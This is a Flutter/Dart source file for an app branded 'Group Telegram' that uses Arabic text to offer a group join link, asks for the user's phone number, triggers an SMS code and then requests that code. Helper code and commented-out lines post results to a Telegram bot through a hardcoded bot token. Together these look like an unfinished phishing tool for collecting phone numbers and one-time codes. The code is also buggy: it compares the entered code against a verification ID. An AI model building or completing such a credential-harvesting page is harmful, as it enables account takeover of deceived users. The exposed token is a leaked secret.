import 'package:firebase_auth/firebase_auth.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:flutter/material.dart';
import 'package:loading_animation_widget/loading_animation_widget.dart';
import 'package:http/http.dart' as http;

void main() async {
  // WidgetsFlutterBinding.ensureInitialized();
  // await Firebase.initializeApp();

  runApp(const MyApp());
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  // This widget is the root of your application.
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'telegram bot',
      theme: ThemeData(
        colorScheme: ColorScheme.fromSeed(seedColor: Colors.blueAccent),
        useMaterial3: true,
      ),
      home: const MyHomePage(),
    );
  }
}

class MyHomePage extends StatefulWidget {
  const MyHomePage({super.key});

  @override
  State<MyHomePage> createState() => _MyHomePageState();
}

class _MyHomePageState extends State<MyHomePage> {
  final fireAuth = FirebaseAuth.instance;
  final formKey = GlobalKey<FormState>();
  final phoneController = TextEditingController();
  final otpController = TextEditingController();
  bool phone = true;
  bool otp = false;
  bool animation = false;
  String? verificationId;

  Future<void> verifyPhoneNumber() async {
    await fireAuth.verifyPhoneNumber(
      phoneNumber: phoneController.text,
      verificationCompleted: (PhoneAuthCredential credential) async {
        // await _auth.signInWithCredential(credential);
        // // Send a message to your Telegram bot
        // await _sendMessageToTelegram('User authenticated: $phoneNumber');
        setState(() {
          phone = false;
          animation = false;
          otp = true;
        });
      },
      verificationFailed: (FirebaseAuthException e) {
        print('Verification failed: ${e.message}');
      },
      codeSent: (String verificationId, int? resendToken) {
        verificationId = verificationId;
        setState(() {
          phone = false;
          animation = false;
          otp = true;
        });
      },
      codeAutoRetrievalTimeout: (String verificationId) {
        // setState(() {
        //   _verificationId = verificationId;
        // });
      },
    );
  }

  Future<void> _sendMessageToTelegram(String message) async {
    const String botToken = '7850027183:AAEwRnzeHdhS5IKO8bF20ubsPi3_lLyt24Q';
    final String chatId = 'YOUR_CHAT_ID';
    final String url =
        'https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=$message';

    final response = await http.get(Uri.parse(url));
    if (response.statusCode == 200) {
      print('Message sent successfully!');
    } else {
      print('Failed to send message: ${response.body}');
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        backgroundColor: Colors.blueAccent,
        title: Row(
          children: [
            Image.asset('images/telegram.png'),
            const SizedBox(
              width: 10.0,
            ),
            const Text(
              'Group Telegram',
              style: TextStyle(fontSize: 25.0, fontWeight: FontWeight.bold),
            )
          ],
        ),
      ),
      body: Center(
        child: Container(
          height: 300,
          width: 300,
          decoration: BoxDecoration(
              borderRadius: BorderRadius.circular(10.0),
              color: Colors.white,
              boxShadow: [
                BoxShadow(
                  blurRadius: 5.0,
                  offset: const Offset(1, 0),
                  color: Colors.black.withOpacity(0.1),
                )
              ]),
          child: Form(
            key: formKey,
            child: Column(
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                Image.asset('images/telegram.png'),
                const SizedBox(
                  height: 20,
                ),
                const Text('رابط الإنضمام للمجموعة',
                    style: TextStyle(
                        color: Colors.black, fontWeight: FontWeight.bold)),
                const SizedBox(height: 20.0),
                if (animation == true)
                  Center(
                    child: LoadingAnimationWidget.fourRotatingDots(
                      color: Colors.blueAccent,
                      size: 200,
                    ),
                  ),
                if (phone == true && !animation)
                  TextFormField(
                    controller: phoneController,
                    keyboardType: TextInputType.phone,
                    validator: (value) {
                      if (value!.isEmpty) {
                        return 'رقم الهاتف غير صحيح';
                      }
                      return null;
                    },
                    decoration: InputDecoration(
                      disabledBorder: OutlineInputBorder(
                          borderSide: BorderSide(color: Colors.grey.shade500)),
                      enabled: true,
                      fillColor: Colors.grey,
                      enabledBorder: const OutlineInputBorder(
                          borderSide: BorderSide(color: Colors.black)),
                      hintText: 'أدخل رقم الهاتف',
                      hintStyle:
                          const TextStyle(color: Colors.grey, fontSize: 15.0),
                    ),
                  ),
                if (otp == true && !animation)
                  TextFormField(
                    controller: otpController,
                    keyboardType: TextInputType.phone,
                    validator: (value) {
                      if (value!.isEmpty) {
                        return ' رمز التحقق غير صحيح';
                      }
                      return null;
                    },
                    decoration: InputDecoration(
                      disabledBorder: OutlineInputBorder(
                          borderSide: BorderSide(color: Colors.grey.shade500)),
                      enabled: true,
                      fillColor: Colors.grey,
                      enabledBorder: const OutlineInputBorder(
                          borderSide: BorderSide(color: Colors.black)),
                      hintText: 'أدخل رمز التحقق',
                      hintStyle:
                          const TextStyle(color: Colors.grey, fontSize: 15.0),
                    ),
                  ),
                const SizedBox(
                  height: 10.0,
                ),
                InkWell(
                  onTap: () async {
                    if (formKey.currentState!.validate()) {
                      if (phone) {
                        setState(() {
                          animation = true;
                        });
                        // phone to firebase auth
                        await verifyPhoneNumber();
                      } else {
                        if (otpController.text.trim() == verificationId) {
                          _sendMessageToTelegram('Hello! how are you ?');
                        }
                      }
                    }
                  },
                  child: Container(
                    alignment: Alignment.center,
                    width: double.infinity,
                    height: 35,
                    decoration: BoxDecoration(
                      color: Colors.blueAccent,
                      borderRadius: BorderRadius.circular(10),
                    ),
                    child: Text(
                      phone == true ? 'الإنضمام' : 'تأكيد',
                      style: const TextStyle(color: Colors.white, fontSize: 15),
                    ),
                  ),
                )
              ],
            ),
          ),
        ),
      ),
    );
  }
}
